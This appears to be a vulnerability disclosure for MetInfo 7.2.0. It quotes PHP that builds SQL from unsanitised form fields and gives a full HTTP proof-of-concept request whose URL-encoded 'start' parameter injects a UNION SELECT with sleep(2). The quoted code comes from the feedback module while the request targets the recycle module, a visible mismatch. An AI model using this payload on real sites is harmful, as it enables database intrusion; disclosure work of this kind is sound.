## 1.Technical Description:
locate in /app/system/feedback/admin/feedback_admin.class.php line:583 to 673:
```
function doexportList()
    {
        global $_M;
        $class1 = is_numeric($_M['form']['class1']) ? $_M['form']['class1'] : '';
        $class2 = is_numeric($_M['form']['class2']) ? $_M['form']['class2'] : '';
        $class3 = is_numeric($_M['form']['class3']) ? $_M['form']['class3'] : '';
        $allid = $_M['form']['allid'];
        $lang = $this->lang;
        $keyword = $_M['form']['keyword'];
        $search_type = $_M['form']['search_type'];
		 ...
		 ...
        $where = " lang='{$lang}' ";
        if (isset($_M['form']['jobid']) && $_M['form']['jobid']) {
            $where .= " AND jobid='{$_M['form']['jobid']}' ";
        }

        switch ($search_type) {
            case 0:
                break;
            case 1:
                $where .= "AND readok = '0' ";
                break;
            case 2:
                $where .= "AND readok = '1' ";
                break;
        }

        if ($allid) {
            $where .= " AND `id` in ({$allid}) ";
        }

        ...
        ...
       if ($search_sql) {
            $where .= " AND  id IN ( {$search_sql}) ";
        }
        //end参数筛选

        $order = ' ORDER BY addtime desc ';

        $query = "SELECT * FROM {$_M['table']['cv']} WHERE {$where} {$order}";
        $cv_list = DB::get_all($query);

        ...
        ...
        ...
    }
```
## 2.poc
Use the Google Chrome open this test site.download the latest version（ https://www.metinfo.cn/download/)
```
POST /MetInfo7.2.0/admin/?n=recycle&c=recycle&a=dojson_list&module=download&start=1%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%73%6c%65%65%70%28%32%29%23 HTTP/1.1
Host: 192.168.209.177
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 0
Origin: http://192.168.209.177
Connection: close
Referer: http://192.168.209.177/MetInfo7.2.0/admin/?lang=cn&n=ui_set
Cookie: PHPSESSID=37mdoi18rh3h5vqraa1r2mn497; admin_lang=cn; Hm_lvt_520556228c0113270c0c772027905838=1615189135; Hm_lpvt_520556228c0113270c0c772027905838=1615343316; arrlanguage=metinfo; re_url=http%3A%2F%2F192.168.209.177%2FMetInfo7.2.0%2Fadmin%2F; met_auth=3b93jK%2FA0WNb4pJ4Q5ikYjHjkYlbNCiE6qZf7KLpJIPDWAUTvoEeuAKdqOunl9dGo8FILgS78Xc%2Brf5CJ%2Bk%2B5mrO4w; met_key=WaqnQr8; page_iframe_url=http%3A%2F%2F192.168.209.177%2FMetInfo7.2.0%2Findex.php%3Flang%3Dcn%26pageset%3D1; met_auths=1


```
## Reporter:
jiedeidei from Topsec Alpha Lab
